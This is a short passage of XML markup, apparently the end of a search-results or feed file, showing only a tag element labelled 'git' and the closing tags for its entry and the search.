            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
